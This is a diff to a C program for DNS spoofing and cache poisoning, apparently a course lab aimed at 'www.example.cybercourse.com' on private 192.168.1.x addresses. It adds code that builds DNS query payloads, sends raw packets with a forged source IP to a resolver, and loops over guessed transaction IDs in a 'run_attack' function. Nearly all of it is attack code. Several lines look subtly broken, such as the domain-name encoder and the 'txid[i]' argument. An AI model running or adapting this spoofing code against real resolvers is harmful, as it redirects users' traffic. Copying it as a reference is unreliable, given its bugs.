@@ -438,8 +438,8 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <sys/socket.h>
-
-
+#include <string.h>
+#include <stdint.h>
 
 
 #define SPOOFED_SOURCE_IP  "192.168.1.207"
@@ -553,24 +553,75 @@ void send_custom_ip_packet(const char *src_ip, const char *dest_ip, int src_port
 
     close(sockfd);
 }
-int full_send_spoofed_dns() {
-    const char *src_ip = "192.168.1.207";  // Custom source IP
+
+
+// Function to encode a domain name into DNS format
+void encode_domain_name(uint8_t *dns, const char *host) {
+    int lock = 0;
+    strcat((char *)dns, ".");
+    for (int i = 0; i < strlen(host); i++) {
+        if (host[i] == '.') {
+            *dns++ = i - lock;
+            for (; lock < i; lock++) {
+                *dns++ = host[lock];
+            }
+            lock++; // Skip the '.'
+        }
+    }
+    *dns++ = '\0';
+}
+
+// Function to build a DNS query payload
+int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint16_t qtype) {
+    uint8_t *ptr = buffer;
+
+    // DNS Header (12 bytes)
+    uint16_t flags = htons(0x0100); // Standard query with recursion desired
+    uint16_t q_count = htons(1);   // Number of questions
+    uint16_t ans_count = 0;        // Number of answer RRs
+    uint16_t auth_count = 0;       // Number of authority RRs
+    uint16_t add_count = 0;        // Number of additional RRs
+
+    *(uint16_t *)ptr = htons(txid); // Transaction ID
+    ptr += 2;
+    *(uint16_t *)ptr = flags;       // Flags
+    ptr += 2;
+    *(uint16_t *)ptr = q_count;     // Questions
+    ptr += 2;
+    *(uint16_t *)ptr = ans_count;   // Answer RRs
+    ptr += 2;
+    *(uint16_t *)ptr = auth_count;  // Authority RRs
+    ptr += 2;
+    *(uint16_t *)ptr = add_count;   // Additional RRs
+    ptr += 2;
+
+    // DNS Question Section
+    encode_domain_name(ptr, hostname); // Encode the query name
+    ptr += strlen((const char *)ptr) + 1;
+
+    *(uint16_t *)ptr = htons(qtype);  // Query type (e.g., A = 1, AAAA = 28, MX = 15)
+    ptr += 2;
+    *(uint16_t *)ptr = htons(1);      // Query class (IN = 1 for internet)
+    ptr += 2;
+
+    return ptr - buffer; // Return the size of the payload
+}
+
+int full_send_spoofed_dns(uint txid) {
+    const char *src_ip = "192.168.1.204";  // Custom source IP
     const char *dest_ip = "192.168.1.203"; // Resolver IP
-    int src_port = 12345;                  // Custom source port
+    int src_port = 1234;                  // Custom source port
     int dest_port = 53;                    // DNS port
 
-    // Example DNS payload (query for www.example.com)
-    uint8_t dns_payload[] = {
-        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x03, 0x77, 0x77, 0x77, 0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65,
-        0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
-    };
-    int dns_payload_size = sizeof(dns_payload);
+    uint8_t dns_payload[BUFFER_SIZE];
+    int dns_payload_size = build_dns_payload(dns_payload, "www.example.cybercourse.com", txid, 1); // Query for A record
 
     send_custom_ip_packet(src_ip, dest_ip, src_port, dest_port, dns_payload, dns_payload_size);
 
     return 0;
 }
+
+
 
 
 
@@ -656,9 +707,6 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(destination_port);
     inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
-
-    // struct iphdr *iph = (struct iphdr *)buffer;
-    // iph->saddr = inet_addr("192.168.1.207"); // Source IP
 
     // Step 3: Assume we already have the DNS query (this would normally come from the client)
     unsigned char query[BUFFER_SIZE];
@@ -789,8 +837,8 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
-        full_send_spoofed_dns();
+        // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
+        full_send_spoofed_dns(txid[i]);
         // send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
     }
     
